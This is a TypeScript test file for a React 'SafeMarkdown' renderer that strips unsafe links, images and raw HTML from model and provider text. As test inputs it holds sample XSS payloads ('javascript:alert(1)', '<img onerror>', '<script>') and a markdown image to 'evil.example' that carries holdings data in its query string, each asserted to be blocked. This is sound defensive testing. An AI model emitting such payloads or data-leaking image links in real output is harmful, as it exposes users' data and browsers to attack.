import { describe, it, expect } from "bun:test";
import { createElement, type ReactNode } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { SafeMarkdown, externalLinkTarget, type InAppLinkRenderer, type MarkdownLinkPolicy } from "./SafeMarkdown";

function render(markdown: string, links?: MarkdownLinkPolicy, renderInAppLink?: InAppLinkRenderer): string {
  return renderToStaticMarkup(createElement(SafeMarkdown, { links, renderInAppLink }, markdown));
}

describe("externalLinkTarget", () => {
  it("opens only https links in model and provider text", () => {
    expect(externalLinkTarget("https://example.com/a?b=1", "https")).toBe("https://example.com/a?b=1");
    expect(externalLinkTarget("http://example.com", "https")).toBeNull();
    expect(externalLinkTarget("mailto:someone@example.com", "https")).toBeNull();
    expect(externalLinkTarget("javascript:alert(1)", "https")).toBeNull();
    expect(externalLinkTarget("#holding:AAPL", "https")).toBeNull();
    expect(externalLinkTarget("/api/app/quit", "https")).toBeNull();
    expect(externalLinkTarget(undefined, "https")).toBeNull();
  });

  it("also opens http and mailto links in release notes", () => {
    expect(externalLinkTarget("http://example.com/", "web")).toBe("http://example.com/");
    expect(externalLinkTarget("mailto:someone@example.com", "web")).toBe("mailto:someone@example.com");
    expect(externalLinkTarget("javascript:alert(1)", "web")).toBeNull();
    expect(externalLinkTarget("data:text/html,x", "web")).toBeNull();
  });
});

describe("SafeMarkdown", () => {
  it("shows the alt text instead of loading an image", () => {
    const html = render("Report ![holdings chart](https://evil.example/p.png?d=AAPL-23)");
    expect(html).not.toContain("<img");
    expect(html).not.toContain("evil.example");
    expect(html).toContain("holdings chart");
  });

  it("keeps https links and turns the rest into text", () => {
    const html = render("[docs](https://example.com/docs) [plain](http://example.com) [mail](mailto:a@example.com) [js](javascript:alert(1))");
    expect(html).toContain('href="https://example.com/docs"');
    expect(html).not.toContain('href="http://example.com');
    expect(html).not.toContain("mailto:");
    expect(html).not.toContain("javascript:");
    expect(html).toContain("<span>plain</span>");
  });

  it("keeps http and mailto links in release notes", () => {
    const html = render("[site](http://example.com/) [mail](mailto:a@example.com)", "web");
    expect(html).toContain('href="http://example.com/"');
    expect(html).toContain('href="mailto:a@example.com"');
  });

  it("renders raw HTML as text", () => {
    const html = render('<img src="x" onerror="alert(1)"> <script>alert(1)</script>');
    expect(html).not.toContain("<img");
    expect(html).not.toContain("<script");
  });

  it("hands in-app links to the given renderer first", () => {
    const renderer: InAppLinkRenderer = (href, children: ReactNode) =>
      href?.startsWith("#holding:") ? createElement("button", { "data-symbol": href.slice("#holding:".length) }, children) : null;
    const html = render("See [Apple](#holding:AAPL) and [docs](https://example.com)", "https", renderer);
    expect(html).toContain('<button data-symbol="AAPL">Apple</button>');
    expect(html).toContain('href="https://example.com/"');
  });
});
